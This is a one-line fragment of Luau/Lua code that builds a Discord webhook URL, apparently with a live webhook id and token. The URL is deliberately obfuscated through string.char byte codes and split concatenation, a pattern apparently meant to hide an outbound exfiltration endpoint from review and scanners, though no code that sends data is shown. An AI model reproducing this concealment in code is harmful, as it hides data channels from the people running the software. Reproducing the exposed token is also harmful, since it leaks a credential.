...
local webhookUrl: string = string.char(104, 116, 116, 112, 115) .. "://disc" .. "ordapp.com" .. "/api/webhooks/" .. "1296339664713682994" .. "/" .. string.char(73, 65, 90, 112, 55) .. "TQBZte" .. "Qz0Mmk_hJStIKCAz0R89Gsa7sHegwHjSdq70" .. "BsZ0t93ryrSAorn60BWhi"
